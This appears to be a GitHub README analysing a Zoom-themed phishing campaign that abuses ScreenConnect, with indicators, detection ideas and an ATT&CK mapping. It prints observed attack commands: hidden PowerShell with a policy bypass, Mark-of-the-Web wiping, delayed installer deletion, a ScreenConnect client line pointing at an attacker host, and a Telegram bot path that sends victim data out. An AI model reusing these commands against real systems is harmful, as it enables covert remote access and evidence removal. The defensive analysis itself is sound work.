# Malicious Zoom-Themed Campaign Leveraging RMM Abuse (ScreenConnect)

![Status](https://img.shields.io/badge/status-analysis-blue)
![Category](https://img.shields.io/badge/category-malware%20analysis-informational)
![Technique](https://img.shields.io/badge/technique-RMM%20abuse-critical)
![Source](https://img.shields.io/badge/source-ANY.RUN-lightgrey)

## Table of Contents

- [Overview](#overview)
- [High-Level Summary](#high-level-summary)
- [Attack Flow](#attack-flow)
- [Technical Deep Dive](#technical-deep-dive)
- [Indicators of Compromise](#indicators-of-compromise)
- [Detection Opportunities](#detection-opportunities)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Repository Structure](#repository-structure)
- [Notes](#notes)

## Overview

This repository documents the analysis of a malicious campaign identified via dynamic analysis in ANY.RUN. The campaign relies on user deception, staged script execution, and abuse of a legitimate remote monitoring and management tool, ScreenConnect, to obtain remote access and persistence.

The attack does not appear to depend on exploit delivery. Instead, it combines social engineering, script-based staging, and a persistent ScreenConnect installation configured to connect to attacker-controlled infrastructure.

## High-Level Summary

At a high level, the campaign impersonates a Zoom-related malfunction and pressures the victim into downloading an alleged updated version of the software. Based on the execution chain observed in ANY.RUN, the following activity was identified:

- Delivery and execution of a VBS staging script
- Hidden PowerShell execution with `ExecutionPolicy Bypass`
- Temporary MSI handling and delayed file cleanup
- ScreenConnect client deployment and service-based persistence
- Telegram bot notification for victim interaction tracking
- Infrastructure references tied to remote administration and attacker-controlled hosting

This makes the campaign notable because it succeeds through user interaction and trusted-tool abuse rather than a vulnerability exploit.

## Attack Flow

1. Victim is lured to a malicious Zoom-themed website
2. Victim is persuaded to download the “latest version”
3. A VBS script is launched with `wscript.exe`
4. The VBS chain triggers PowerShell in a hidden window
5. Payload components are staged in `%TEMP%`
6. A ScreenConnect client is installed
7. A Windows service is created for persistence
8. Victim telemetry is relayed through the Telegram Bot API

## Technical Deep Dive

### 1. Social Engineering and Initial Access

The campaign appears designed to convince the victim that a Zoom meeting is malfunctioning. Based on the notes extracted from ANY.RUN, the lure includes a meeting-like interface with missing participant media, confusion around captions, and a prompt instructing the user to download an updated version before returning to the session.

**Image Placeholder**
- `screenshots/01_fake_zoom_interface.png`
- `screenshots/02_download_prompt.png`

### 2. VBS Staging Activity

Observed execution:
```cmd
C:\Windows\System32\wscript.exe "C:\Users\admin\AppData\Local\Temp\ZoomInstaller_Final.vbs"
```

The telemetry also shows:
- Expansion of `%TEMP%` via `IWshShell3 -> ExpandEnvironmentStrings`
- Base64 handling through `IXMLDOMElement -> dataType = "bin.base64"`

These behaviors strongly suggest a VBS staging role responsible for decoding content, writing or reconstructing additional payload components, and triggering the next execution stage.

### 3. PowerShell Execution

Observed command:
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\admin\AppData\Local\Temp\ZoomInstaller_Final.ps1"
```

This is a common malicious execution pattern because it:
- Avoids profile loading
- Bypasses execution policy restrictions
- Hides the PowerShell window from the user

**Image Placeholder**
- `screenshots/03_powershell_execution.png`

### 4. Zone.Identifier Removal and Cleanup

Observed commands indicate attempts to suppress Mark-of-the-Web evidence and reduce post-execution artifacts:

```cmd
"C:\Windows\System32\cmd.exe" /c echo. > "C:\Users\admin\Downloads\DesktopInstaller.vbs:Zone.Identifier" 2>nul
"C:\Windows\System32\cmd.exe" /c echo. > "C:\Users\admin\AppData\Local\Temp\installer_55569.msi:Zone.Identifier" 2>nul
```

Delayed cleanup was also observed:
```cmd
"C:\Windows\System32\cmd.exe" /c ping -n 15 127.0.0.1 >nul & del /f /q "C:\Users\admin\AppData\Local\Temp\installer_55569.msi" 2>nul
```

This indicates a deliberate attempt to reduce forensic visibility after payload delivery.

### 5. ScreenConnect Deployment

Observed service executable:
```cmd
C:\Program Files (x86)\ScreenConnect Client (d33f78b4994b28a6)\ScreenConnect.ClientService.exe
```

Observed command line:
```cmd
"C:\Program Files (x86)\ScreenConnect Client (d33f78b4994b28a6)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=labogz.com&p=8041&s=a922f424-3ea9-41da-8b4a-1dfd978702f8&k=..."
```

The parameter set indicates that the client was not merely dropped, but provisioned to connect to a specific remote host and session context.

**Image Placeholder**
- `screenshots/04_screenconnect_service.png`

### 6. Persistence via Windows Service

Observed registry path:
```reg
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ScreenConnect Client (d33f78b4994b28a6)
```

This registry location is consistent with service creation and long-term persistence.

### 7. COM Registration Activity

Observed registry modification:
```reg
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6FF59A85-BC37-4CD4-E747-4A924E84C083}\InprocServer32
ThreadingModel = Apartment
```

This indicates COM registration activity. At this stage, the observation supports one of the following explanations:
- Legitimate component registration by the installed ScreenConnect-related payload
- Malicious COM-based component installation
- A persistence-enabling or execution-enabling registration step

Without the registered DLL path and signature validation, this should be treated as suspicious but not over-attributed.

### 8. Telegram Bot Notification

Observed bot API path:
```text
/bot8306714610:AAEH6GIcZcdlCoXhGj48AhMaYqeQRaMNtCQ/sendMessage?chat_id=8440526525&text=...
```

The notes also include a sample message containing:
- Victim username
- Victim IP
- User-Agent / device context

This suggests the operator receives near-real-time interaction telemetry when the victim clicks the download flow.

**Image Placeholder**
- `screenshots/05_telegram_notification.png`

## Indicators of Compromise

### Domains
- `us10web-zoom-usj72134381229pwdbnyi1fscht4pswnd37hhluqrkq5yjd.starspirit.org`
- `labogz.com`

### IP Addresses
- `91.209.135.177`
- `149.154.166.110`
- `84.200.33.139`

### File Hashes (SHA-256)
- `f80c352b3d69a48f99f1ee3fe607761b9895138d4a6aa870e64ac4bd0d1613c2` — VBS script
- `f048400c23add8c75abe189393d33c873c02c74eeaf43d47b950c8d643763b35` — ScreenConnect.WindowsBackstageShell.exe
- `1404090db3128de503ba4d991a960c7c1bc3b910a62d06ecf7e7081a2fcf11b9` — ScreenConnect.WindowsFileManager.exe
- `13f8cfe4648b807a0cbddd653c75254b60d1951e11e715f4e5a1a2c9ab29360b` — ScreenConnect component
- `6ba313f9e9116e80eb6c5ddbff21fb1ec71d267460dc2622bfde275cacbd9508` — Remote admin component
- `eb0a361d105fbaa04c94a5fcccc49af982698abbf93963ca13425258043bc903` — `user.config`

## Detection Opportunities

### Behavioral
- `wscript.exe` spawning PowerShell
- PowerShell executed with `-ExecutionPolicy Bypass`
- PowerShell executed with `-WindowStyle Hidden`
- ScreenConnect service creation in a non-corporate context
- Delayed cleanup of installer components
- Telegram Bot API communication during download flow

### Registry
- `HKLM\SYSTEM\ControlSet001\Services\ScreenConnect*`
- `HKLM\SOFTWARE\Classes\CLSID\*\InprocServer32`

### Network
- Access to `labogz.com:8041`
- Telegram bot API communication
- Access to Zoom-themed lure infrastructure on `starspirit.org`

## MITRE ATT&CK Mapping

| Technique | Name |
|---|---|
| T1566 | Phishing |
| T1204 | User Execution |
| T1059.005 | Visual Basic |
| T1059.001 | PowerShell |
| T1105 | Ingress Tool Transfer |
| T1219 | Remote Access Software |
| T1071.001 | Web Protocols |
| T1071 | Application Layer Protocol |

## Repository Structure

```text
zoom-rmm-malware-analysis/
├── README.md
├── analysis/
│   └── full_report.md
├── artifacts/
│   ├── domains.txt
│   ├── hashes.txt
│   ├── ips.txt
│   ├── registry_keys.txt
│   └── urls.txt
├── detections/
│   ├── kql/
│   │   └── suspicious_zoom_rmm_chain.kql
│   ├── sigma/
│   │   ├── powershell_hidden_bypass.yml
│   │   ├── screenconnect_service_install.yml
│   │   └── wscript_to_powershell_chain.yml
│   └── xql/
│       └── suspicious_zoom_rmm_chain.xql
├── screenshots/
│   ├── .gitkeep
│   └── README.md
└── scripts/
    └── decoded_payloads/
        └── README.md
```

## Notes

- This repository is intentionally structured so screenshots from ANY.RUN can be added later without changing the narrative.
- The current assessment is based on the notes and telemetry extracted from ANY.RUN, not on full reverse engineering of every dropped script or binary.
- The COM registration step should remain classified as suspicious until the backing DLL path is validated.
